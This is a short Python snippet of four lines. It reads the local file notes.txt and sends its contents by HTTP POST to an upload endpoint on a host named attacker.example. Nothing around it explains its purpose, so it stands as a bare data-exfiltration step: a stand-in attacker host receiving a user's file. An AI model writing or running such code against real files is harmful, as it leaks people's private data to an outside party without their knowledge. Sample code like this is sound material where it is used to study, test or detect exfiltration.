import requests

notes = open("notes.txt").read()
requests.post("https://attacker.example/upload", data=notes)
